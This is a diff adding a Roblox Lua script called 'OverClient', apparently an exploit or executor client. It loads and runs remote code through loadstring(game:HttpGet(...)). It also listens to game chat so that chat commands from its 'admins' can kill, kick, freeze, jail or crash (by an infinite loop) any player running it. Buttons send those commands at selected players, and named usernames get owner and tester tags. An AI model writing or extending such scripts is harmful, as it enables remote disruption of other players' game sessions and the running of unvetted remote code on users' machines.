@@ -1,0 +1,465 @@
+-- OverClient - Com Freeze, Jail Corrigido e Sistema de Tags
+-- Desenvolvido por: Dev over
+
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local TextChatService = game:GetService("TextChatService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+print("🎯 Iniciando OverClient...")
+
+-- ===== CARREGAR WINDUI =====
+local WindUI = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()
+
+-- ===== CRIAR JANELA =====
+local Window = WindUI:CreateWindow({
+    Title = "OverClient",
+    Icon = "shield",
+    Author = "By Dev over",
+    Folder = "OverClient",
+    Size = UDim2.fromOffset(330, 250),
+    Transparent = true,
+    Theme = "Red",
+    Resizable = true,
+    SideBarWidth = 200,
+    Background = "728316102835",
+    BackgroundImageTransparency = 0.10,
+    HideSearchBar = true,
+    ScrollBarEnabled = false
+})
+
+Window:EditOpenButton({
+    Title = "OverClient ADM",
+    Icon = "shield",
+    CornerRadius = UDim.new(0,16),
+    StrokeThickness = 2,
+    Color = ColorSequence.new(
+        Color3.fromHex("FF0000"), 
+        Color3.fromHex("FFFFFF")
+    ),
+    OnlyMobile = false,
+    Enabled = true,
+    Draggable = true,
+})
+
+-- ===== SISTEMA DE TAGS PERSONALIZADAS =====
+local playerTags = {
+    ["Rafaelgms7810396"] = {"[Dono]", Color3.fromRGB(170, 0, 255)},     -- Roxo
+    ["Rafaezinn_0012"] = {"[Tester]", Color3.fromRGB(0, 255, 0)},       -- Verde
+    ["Hiro0881"] = {"[Sub-Dono]", Color3.fromRGB(255, 165, 0)},         -- Laranja
+    ["Killert_494"] = {"[Tester]", Color3.fromRGB(0, 255, 0)},          -- Verde
+    ["Dracius244"] = {"[Tester]", Color3.fromRGB(0, 255, 0)},           -- Verde
+    ["EN12039"] = {"[Tester]", Color3.fromRGB(0, 255, 0)},              -- Verde
+    ["matador_de7RP"] = {"[Tester]", Color3.fromRGB(0, 255, 0)},        -- Verde
+    ["Hgsjehejjejejejejje"] = {"[Tester]", Color3.fromRGB(0, 255, 0)}   -- Verde
+}
+
+-- Função para criar tag na cabeça do jogador
+local function CreatePlayerTag(player)
+    if playerTags[player.Name] then
+        local tagInfo = playerTags[player.Name]
+        local tagText = tagInfo[1]
+        local tagColor = tagInfo[2]
+        
+        local function applyTag(character)
+            wait(1) -- Esperar carregar
+            
+            -- Remover tag anterior se existir
+            local existingTag = character:FindFirstChild("OverClientTag")
+            if existingTag then
+                existingTag:Destroy()
+            end
+            
+            -- Criar BillboardGui para a tag
+            local billboard = Instance.new("BillboardGui")
+            billboard.Name = "OverClientTag"
+            billboard.Adornee = character:WaitForChild("Head")
+            billboard.Size = UDim2.new(0, 200, 0, 50)
+            billboard.StudsOffset = Vector3.new(0, 2.5, 0)
+            billboard.AlwaysOnTop = true
+            billboard.MaxDistance = 100
+            billboard.Parent = character
+            
+            -- Criar texto da tag
+            local textLabel = Instance.new("TextLabel")
+            textLabel.Size = UDim2.new(1, 0, 1, 0)
+            textLabel.BackgroundTransparency = 1
+            textLabel.Text = tagText
+            textLabel.TextColor3 = tagColor
+            textLabel.TextStrokeTransparency = 0
+            textLabel.TextStrokeColor3 = Color3.new(0, 0, 0)
+            textLabel.Font = Enum.Font.GothamBold
+            textLabel.TextSize = 18
+            textLabel.TextScaled = false
+            textLabel.Parent = billboard
+            
+            print("🏷️ Tag criada para: " .. player.Name)
+        end
+        
+        -- Conectar para quando o personagem spawnar
+        player.CharacterAdded:Connect(applyTag)
+        
+        -- Aplicar tag se o personagem já existir
+        if player.Character then
+            applyTag(player.Character)
+        end
+    end
+end
+
+-- ===== ABA PRINCIPAL =====
+local Tab = Window:Tab({
+    Title = "Principal",
+    Icon = "skull",
+    Locked = false,
+})
+
+-- ===== VARIÁVEIS PARA FREEZE E JAIL =====
+local frozenPlayers = {}
+local jailedPlayers = {}
+
+-- ===== SISTEMA DE COMANDOS =====
+local function ProcessarComando(mensagem)
+    if string.sub(mensagem, 1, 1) == ";" then
+        local partes = string.split(string.sub(mensagem, 2), " ")
+        local comando = partes[1]:lower()
+        local nomeAlvo = table.concat(partes, " ", 2)
+        
+        -- Verifica se o comando é para ESTE jogador
+        if nomeAlvo and (nomeAlvo:lower() == LocalPlayer.Name:lower() or nomeAlvo:lower() == LocalPlayer.DisplayName:lower()) then
+            print("🎯 Comando recebido: " .. comando .. " para " .. LocalPlayer.Name)
+            
+            if comando == "kill" and LocalPlayer.Character then
+                LocalPlayer.Character:BreakJoints()
+                print("💀 KILL executado em " .. LocalPlayer.Name)
+            elseif comando == "kick" then
+                LocalPlayer:Kick("🚫 Você foi banido por um admin do OverClient")
+                print("👢 KICK executado em " .. LocalPlayer.Name)
+            elseif comando == "crash" then
+                print("💥 CRASH executado em " .. LocalPlayer.Name)
+                while true do end
+            elseif comando == "freeze" and LocalPlayer.Character then
+                -- ❄️ FREEZE COM SPEED 0 ❄️
+                local character = LocalPlayer.Character
+                local humanoid = character:FindFirstChild("Humanoid")
+                
+                if humanoid then
+                    frozenPlayers[LocalPlayer.Name] = true
+                    humanoid.WalkSpeed = 0
+                    humanoid.JumpPower = 0
+                    print("❄️ FREEZE executado em " .. LocalPlayer.Name)
+                end
+            elseif comando == "unfreeze" and LocalPlayer.Character then
+                -- 🔥 UNFREEZE COM SPEED NORMAL 🔥
+                local character = LocalPlayer.Character
+                local humanoid = character:FindFirstChild("Humanoid")
+                
+                if humanoid then
+                    frozenPlayers[LocalPlayer.Name] = nil
+                    humanoid.WalkSpeed = 16
+                    humanoid.JumpPower = 50
+                    print("🔥 UNFREEZE executado em " .. LocalPlayer.Name)
+                end
+            elseif comando == "jail" and LocalPlayer.Character then
+                -- 🔒 SISTEMA DE JAIL CORRIGIDO 🔒
+                local character = LocalPlayer.Character
+                local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
+                
+                if humanoidRootPart then
+                    -- Criar prisão ROXA TRANSPARENTE
+                    local jail = Instance.new("Part")
+                    jail.Name = "OverClientJail_" .. LocalPlayer.Name
+                    jail.Size = Vector3.new(15, 10, 15)
+                    jail.Material = Enum.Material.Neon
+                    jail.BrickColor = BrickColor.new("Royal purple")
+                    jail.Position = humanoidRootPart.Position + Vector3.new(0, 5, 0) -- Posiciona acima do chão
+                    jail.Anchored = true
+                    jail.CanCollide = true
+                    jail.Transparency = 0.7
+                    jail.Parent = workspace
+                    
+                    -- Teletransportar para o CENTRO da prisão (DENTRO dela)
+                    humanoidRootPart.Position = jail.Position + Vector3.new(0, -3, 0) -- Posiciona DENTRO da jail
+                    
+                    -- Congelar personagem dentro da prisão
+                    local humanoid = character:FindFirstChild("Humanoid")
+                    if humanoid then
+                        humanoid.PlatformStand = false  -- Permite ficar em pé
+                        humanoid.WalkSpeed = 0          -- Mas não anda
+                        humanoid.JumpPower = 0          -- E não pula
+                    end
+                    
+                    jailedPlayers[LocalPlayer.Name] = jail
+                    
+                    print("🔒 JAIL CORRIGIDO executado em " .. LocalPlayer.Name)
+                end
+            elseif comando == "unjail" and LocalPlayer.Character then
+                -- 🔓 SISTEMA DE UNJAIL 🔓
+                local character = LocalPlayer.Character
+                
+                -- Restaurar movimento do personagem
+                local humanoid = character:FindFirstChild("Humanoid")
+                if humanoid then
+                    humanoid.WalkSpeed = 16
+                    humanoid.JumpPower = 50
+                end
+                
+                -- Remover prisão
+                local jailName = "OverClientJail_" .. LocalPlayer.Name
+                for _, obj in pairs(workspace:GetChildren()) do
+                    if obj.Name == jailName and obj:IsA("Part") then
+                        obj:Destroy()
+                    end
+                end
+                
+                jailedPlayers[LocalPlayer.Name] = nil
+                
+                print("🔓 UNJAIL executado em " .. LocalPlayer.Name)
+            end
+        end
+        
+        -- ⚡ DETECTA ;verifique E EXECUTA EM TODOS (INCLUINDO VOCÊ) ⚡
+        if comando == "verifique" then
+            print("🎯 Verificação detectada! Digitando User_Overclient...")
+            
+            wait(2)
+            
+            if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+                local canal = TextChatService.TextChannels.RBXGeneral
+                if canal then
+                    canal:SendAsync("User_Overclient")
+                    print("✅ User_Overclient enviado por: " .. LocalPlayer.Name)
+                end
+            else
+                ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("User_Overclient", "All")
+                print("✅ User_Overclient enviado por: " .. LocalPlayer.Name)
+            end
+        end
+    end
+end
+
+-- Conectar ao chat para RECEBER comandos
+task.spawn(function()
+    wait(3)
+    local canal = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
+    if canal then
+        canal.OnIncomingMessage = function(mensagem)
+            ProcessarComando(mensagem.Text)
+        end
+        print("✅ Sistema de comandos ativo!")
+    end
+end)
+
+-- ===== LISTA DE JOGADORES =====
+local playerNames = {}
+for _, plr in ipairs(Players:GetPlayers()) do
+    table.insert(playerNames, plr.Name)
+end
+
+-- Variável para armazenar os jogadores selecionados no Dropdown
+local selectedPlayers = {}
+
+local Dropdown = Tab:Dropdown({
+    Title = "Selecionar Jogadores",
+    Values = playerNames,
+    Value = {},
+    Multi = true,
+    AllowNone = true,
+    Callback = function(newSelectedPlayers)
+        selectedPlayers = newSelectedPlayers
+        print("Jogadores selecionados: " .. table.concat(selectedPlayers, ", "))
+    end
+})
+
+-- Atualiza lista automaticamente quando entra ou sai jogador
+Players.PlayerAdded:Connect(function(plr)
+    table.insert(playerNames, plr.Name)
+    Dropdown:SetValues(playerNames)
+end)
+
+Players.PlayerRemoving:Connect(function(plr)
+    for i, name in ipairs(playerNames) do
+        if name == plr.Name then
+            table.remove(playerNames, i)
+            break
+        end
+    end
+    Dropdown:SetValues(playerNames)
+end)
+
+-- ===== BOTÃO VERIFIQUE =====
+local VerifyButton = Tab:Button({
+    Title = "Verifique",
+    Icon = "check",
+    Callback = function()
+        -- Enviar "/Verify" no chat
+        if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+            local textChannel = TextChatService.TextChannels.RBXGeneral
+            if textChannel then
+                textChannel:SendAsync(";verifique")
+                WindUI:Notify("Verificação", "Comando ;verifique enviado no chat!")
+            end
+        else
+            ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(";verifique", "All")
+            WindUI:Notify("Verificação", "Comando ;verifique enviado no chat!")
+        end
+    end
+})
+
+-- ===== COMANDOS ADMIN =====
+local KillButton = Tab:Button({
+    Title = "Kill",
+    Icon = "skull",
+    Callback = function()
+        if #selectedPlayers > 0 then
+            for _, playerName in ipairs(selectedPlayers) do
+                local mensagem = ";kill " .. playerName
+                TextChatService.TextChannels.RBXGeneral:SendAsync(mensagem)
+            end
+            WindUI:Notify("Kill", "Comando executado!")
+        end
+    end
+})
+
+local KickButton = Tab:Button({
+    Title = "Kick", 
+    Icon = "door-open",
+    Callback = function()
+        if #selectedPlayers > 0 then
+            for _, playerName in ipairs(selectedPlayers) do
+                local mensagem = ";kick " .. playerName
+                TextChatService.TextChannels.RBXGeneral:SendAsync(mensagem)
+            end
+            WindUI:Notify("Kick", "Comando executado!")
+        end
+    end
+})
+
+local CrashButton = Tab:Button({
+    Title = "Crash",
+    Icon = "alert-triangle", 
+    Callback = function()
+        if #selectedPlayers > 0 then
+            for _, playerName in ipairs(selectedPlayers) do
+                local mensagem = ";crash " .. playerName
+                TextChatService.TextChannels.RBXGeneral:SendAsync(mensagem)
+            end
+            WindUI:Notify("Crash", "Comando executado!")
+        end
+    end
+})
+
+-- ===== BOTÕES FREEZE =====
+local FreezeButton = Tab:Button({
+    Title = "❄️ FREEZE",
+    Icon = "snowflake",
+    Callback = function()
+        if #selectedPlayers > 0 then
+            for _, playerName in ipairs(selectedPlayers) do
+                local mensagem = ";freeze " .. playerName
+                TextChatService.TextChannels.RBXGeneral:SendAsync(mensagem)
+            end
+            WindUI:Notify("FREEZE", "❄️ Congelando " .. #selectedPlayers .. " jogador(es)!")
+        else
+            WindUI:Notify("Erro", "❌ Selecione jogadores primeiro!")
+        end
+    end
+})
+
+local UnfreezeButton = Tab:Button({
+    Title = "🔥 UNFREEZE",
+    Icon = "flame",
+    Callback = function()
+        if #selectedPlayers > 0 then
+            for _, playerName in ipairs(selectedPlayers) do
+                local mensagem = ";unfreeze " .. playerName
+                TextChatService.TextChannels.RBXGeneral:SendAsync(mensagem)
+            end
+            WindUI:Notify("UNFREEZE", "🔥 Descongelando " .. #selectedPlayers .. " jogador(es)!")
+        else
+            WindUI:Notify("Erro", "❌ Selecione jogadores primeiro!")
+        end
+    end
+})
+
+-- ===== BOTÕES JAIL =====
+local JailButton = Tab:Button({
+    Title = "🔒 JAIL",
+    Icon = "lock",
+    Callback = function()
+        if #selectedPlayers > 0 then
+            for _, playerName in ipairs(selectedPlayers) do
+                local mensagem = ";jail " .. playerName
+                TextChatService.TextChannels.RBXGeneral:SendAsync(mensagem)
+            end
+            WindUI:Notify("JAIL", "🔒 Prendendo " .. #selectedPlayers .. " jogador(es)!")
+        else
+            WindUI:Notify("Erro", "❌ Selecione jogadores primeiro!")
+        end
+    end
+})
+
+local UnjailButton = Tab:Button({
+    Title = "🔓 UNJAIL",
+    Icon = "unlock",
+    Callback = function()
+        if #selectedPlayers > 0 then
+            for _, playerName in ipairs(selectedPlayers) do
+                local mensagem = ";unjail " .. playerName
+                TextChatService.TextChannels.RBXGeneral:SendAsync(mensagem)
+            end
+            WindUI:Notify("UNJAIL", "🔓 Soltando " .. #selectedPlayers .. " jogador(es)!")
+        else
+            WindUI:Notify("Erro", "❌ Selecione jogadores primeiro!")
+        end
+    end
+})
+
+-- ===== ABA VERIFY =====
+local VerifyTab = Window:Tab({
+    Title = "Verify",
+    Icon = "check",
+    Locked = false,
+})
+
+-- ===== BOTÃO VERIFIQUE NA ABA VERIFY =====
+local VerifyButtonVerifyTab = VerifyTab:Button({
+    Title = "Enviar Verificação",
+    Icon = "check",
+    Callback = function()
+        -- Enviar ";verifique" no chat
+        if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+            local textChannel = TextChatService.TextChannels.RBXGeneral
+            if textChannel then
+                textChannel:SendAsync(";verifique")
+                WindUI:Notify("Verificação", "Comando ;verifique enviado no chat!")
+            end
+        else
+            ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(";verifique", "All")
+            WindUI:Notify("Verificação", "Comando ;verifique enviado no chat!")
+        end
+    end
+})
+
+-- ===== INICIALIZAR SISTEMA DE TAGS =====
+-- Aplicar tags para jogadores existentes
+for _, player in ipairs(Players:GetPlayers()) do
+    CreatePlayerTag(player)
+end
+
+-- Aplicar tags para novos jogadores
+Players.PlayerAdded:Connect(function(player)
+    CreatePlayerTag(player)
+end)
+
+-- ===== INICIALIZAR =====
+WindUI:Notify("OverClient", "Sistema carregado com sucesso! ✅")
+print("🎮 OVERCLIENT - SISTEMA FUNCIONANDO!")
+print("👑 Desenvolvido por: Dev over")
+print("🏷️ Tag [Dono] aplicada para: Rafaelgms7810396")
+print("🏷️ Tag [Tester] aplicada para: Rafaezinn_0012")
+print("🏷️ Tag [Sub-Dono] aplicada para: Hiro0881")
+print("🏷️ Tag [Tester] aplicada para: Killert_494")
+print("🏷️ Tag [Tester] aplicada para: Dracius244")
+print("🏷️ Tag [Tester] aplicada para: EN12039")
+print("🏷️ Tag [Tester] aplicada para: matador_de7RP")
+print("🏷️ Tag [Tester] aplicada para: Hgsjehejjejejejejje")
